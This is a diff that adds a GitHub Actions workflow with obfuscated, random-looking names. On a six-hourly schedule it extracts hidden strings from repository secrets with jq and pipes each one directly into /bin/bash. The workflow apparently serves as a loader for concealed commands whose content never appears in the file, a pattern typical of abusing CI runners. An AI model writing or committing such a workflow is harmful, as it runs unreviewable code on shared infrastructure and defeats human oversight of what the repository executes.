@@ -1,0 +1,27 @@
+name: wangyunzhou4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangyunzhou4567
+        env:
+          lya7581: ${{ secrets.lya7581 }}
+        run: |
+          echo $lya7581 | jq -r .ys763 | /bin/bash
+          echo $omta8336 | jq -r .v25883 | /bin/bash
+          echo $cfvj10 | jq -r .wptcw7 | /bin/bash
+          echo $dxvtx73 | jq -r .oks6 | /bin/bash
+          echo $u538 | jq -r .ylvqu1930 | /bin/bash
+          echo $igo91976 | jq -r .x73464 | /bin/bash
+          echo $difpo0 | jq -r .f1238 | /bin/bash
+          echo $lsx77922 | jq -r .bb52 | /bin/bash
+          echo $uhpj40 | jq -r .bbt39 | /bin/bash
+          echo $p86247 | jq -r .zsa8 | /bin/bash
+          echo $s13457 | jq -r .wqhdj63546 | /bin/bash
+
